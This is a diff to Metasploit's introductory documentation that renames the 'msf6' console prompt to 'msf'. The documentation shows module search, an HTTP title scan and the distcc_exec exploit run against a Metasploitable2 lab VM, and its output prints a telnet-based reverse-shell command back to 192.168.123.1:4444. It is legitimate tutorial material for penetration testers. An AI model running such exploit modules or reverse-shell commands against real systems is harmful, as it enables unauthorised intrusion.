@@ -18,7 +18,7 @@ Assuming you have installed Metasploit, either with the official Rapid7 nightly 
 
 Metasploit Documentation: https://docs.metasploit.com/
 
-msf6 >
+msf >
 ```
 
 ### Finding modules
@@ -33,7 +33,7 @@ Metasploit is based around the concept of [[modules]]. The most commonly used mo
 You can use the `search` command to search for modules:
 
 ```msf
-msf6 > search type:auxiliary http html title tag
+msf > search type:auxiliary http html title tag
 
 Matching Modules
 ================
@@ -45,15 +45,15 @@ Matching Modules
 
 Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/title
 
-msf6 >
+msf >
 ```
 
 You can `use` a Metasploit module by specifying the full module name. The prompt will be updated to indicate the currently
 active module:
 
 ```msf
-msf6 > use auxiliary/scanner/http/title
-msf6 auxiliary(scanner/http/title) > 
+msf > use auxiliary/scanner/http/title
+msf auxiliary(scanner/http/title) > 
 ```
 
 ### Running Auxiliary modules
@@ -62,14 +62,14 @@ Auxiliary modules do not exploit a target, but can perform data gathering or adm
 extracting the HTTP title from a server:
 
 ```msf
-msf6 > use auxiliary/scanner/http/title
-msf6 auxiliary(scanner/http/title) > 
+msf > use auxiliary/scanner/http/title
+msf auxiliary(scanner/http/title) > 
 ```
 
 Each module offers configurable options which can be viewed with the `show options`, or aliased `options`, command:
 
 ```msf
-msf6 auxiliary(scanner/http/title) > show options
+msf auxiliary(scanner/http/title) > show options
 
 Module options (auxiliary/scanner/http/title):
 
@@ -88,21 +88,21 @@ Module options (auxiliary/scanner/http/title):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(scanner/http/title) > 
+msf auxiliary(scanner/http/title) > 
 ```
 
 To set a module option, use the `set command`. We will set the `RHOST` option - which represents the target host(s) that 
 the module will run against:
 
 ```msf
-msf6 auxiliary(scanner/http/title) > set RHOSTS google.com
+msf auxiliary(scanner/http/title) > set RHOSTS google.com
 RHOSTS => google.com
 ```
 
 The `run` command will run the module against the target, showing the target's HTTP title:
 
 ```msf
-msf6 auxiliary(scanner/http/title) > run
+msf auxiliary(scanner/http/title) > run
 
 [+] [142.250.180.14:80] [C:301] [R:http://www.google.com/] [S:gws] 301 Moved
 [*] Scanned 1 of 1 hosts (100% complete)
@@ -113,7 +113,7 @@ New in Metasploit 6 there is added support for running modules with options set 
 both `RHOSTS` and enabling `HttpTrace` functionality:
 
 ```msf
-msf6 auxiliary(scanner/http/title) > run rhosts=google.com httptrace=true 
+msf auxiliary(scanner/http/title) > run rhosts=google.com httptrace=true 
 
 ####################
 # Request:
@@ -142,7 +142,7 @@ The document has moved
 [+] [142.250.180.14:80] [C:301] [R:http://www.google.com/] [S:gws] 301 Moved
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/title) > 
+msf auxiliary(scanner/http/title) > 
 ```
 
 ### Running exploit modules
@@ -156,9 +156,9 @@ For instance in a Virtual Machine, or with Docker. There are multiple pre-built 
 For instance - targeting a vulnerable Metasploitable2 VM and using the `unix/misc/distcc_exec` module:
 
 ```msf
-msf6 > use unix/misc/distcc_exec
+msf > use unix/misc/distcc_exec
 [*] Using configured payload cmd/unix/reverse_bash
-msf6 exploit(unix/misc/distcc_exec) > 
+msf exploit(unix/misc/distcc_exec) > 
 ```
 
 Exploit modules will generally at a minimum require the following options to be set:
@@ -170,7 +170,7 @@ Exploit modules will generally at a minimum require the following options to be 
 Each module offers configurable options which can be viewed with the `show options`, or aliased `options`, command:
 
 ```msf
-msf6 exploit(unix/misc/distcc_exec) > options
+msf exploit(unix/misc/distcc_exec) > options
 
 Module options (exploit/unix/misc/distcc_exec):
 
@@ -198,24 +198,24 @@ Exploit target:
 
 View the full module info with the info, or info -d command.
 
-msf6 exploit(unix/misc/distcc_exec) > 
+msf exploit(unix/misc/distcc_exec) > 
 ```
 
 For this scenario you can manually set each of the required option values (`RHOST`, `LHOST`, and optionally `PAYLOAD`):
 
 ```msf
-msf6 exploit(unix/misc/distcc_exec) > set rhost 192.168.123.133
+msf exploit(unix/misc/distcc_exec) > set rhost 192.168.123.133
 rhost => 192.168.123.133
-msf6 exploit(unix/misc/distcc_exec) > set lhost 192.168.123.1
+msf exploit(unix/misc/distcc_exec) > set lhost 192.168.123.1
 lhost => 192.168.123.1
-msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
+msf exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
 payload => cmd/unix/reverse
 ```
 
 The `run` command will run the module against the target, there is also an aliased `exploit` command which will perform the same action:
 
 ```msf
-msf6 exploit(unix/misc/distcc_exec) > run
+msf exploit(unix/misc/distcc_exec) > run
 
 [+] sh -c '(sleep 4375|telnet 192.168.123.1 4444|while : ; do sh && break; done 2>&1|telnet 192.168.123.1 4444 >/dev/null 2>&1 &)'
 [*] Started reverse TCP double handler on 192.168.123.1:4444 
@@ -238,7 +238,7 @@ daemon
 New in Metasploit 6 there is added support for running modules with options set as part of the run command:
 
 ```msf
-msf6 exploit(unix/misc/distcc_exec) > run rhost=192.168.123.133 lhost=192.168.123.1 payload=cmd/unix/reverse
+msf exploit(unix/misc/distcc_exec) > run rhost=192.168.123.133 lhost=192.168.123.1 payload=cmd/unix/reverse
 
 [+] sh -c '(sleep 4305|telnet 192.168.123.1 4444|while : ; do sh && break; done 2>&1|telnet 192.168.123.1 4444 >/dev/null 2>&1 &)'
 [*] Started reverse TCP double handler on 192.168.123.1:4444
